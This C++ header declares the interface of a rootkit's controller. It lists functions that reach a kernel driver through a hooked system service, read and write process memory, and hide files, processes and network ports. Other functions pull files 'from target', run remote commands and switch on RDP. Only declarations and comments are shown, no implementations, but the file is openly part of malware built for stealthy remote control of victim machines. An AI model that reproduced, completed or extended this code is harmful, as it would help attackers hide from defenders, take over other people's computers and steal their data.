#pragma once
#include "internet.h"
#include "piping.h"

template<typename ... Arg>
ULONG64 CallHook(const Arg ... args);  // Actual function that calls the DLL function of the hooked system service

namespace DriverCalls {
	int CallKernelDriver(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, BOOL PassBack, HANDLE* PipeHandle, LogFile* MediumLog);  // Calls CallHook and handles sending the results back to the client if needed
	int WriteKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr, HANDLE* PipeHandle, LogFile* MediumLog);  // Write into process virtual memory (from US buffer/another process VM)
	int ReadKernelCall(SOCKET ClientToServerSocket, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Read from a process virtual memory
	int MdlBaseKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Get the base address of a running process in memory
	int SysInfoKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer, char* InfoTypesStr, ROOTKIT_UNEXERR Err, ULONG64 AttrBufferSize, HANDLE* PipeHandle, LogFile* MediumLog);  // Get specific system information with ZwQuerySystemInformation()
	int AllocSpecKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Allocate specific memory region in memory of a certain running process (and keep it running)
	int HideFileKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Dynamically hide specific files/folders
	int HideProcessKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Dynamically hide processes
	int HidePortCommunicationKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Dynamically hide port connections
}
namespace RegularRequests {
	int DownloadFileRequest(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* FilePath, LogFile* MediumLog);  // Get file from target
	int RemoteCommandRequest(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* NakedCommand, LogFile* MediumLog);  // Execute command
	int ActivateRDPRequest(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, LogFile* MediumLog);  // Activate RDP server
}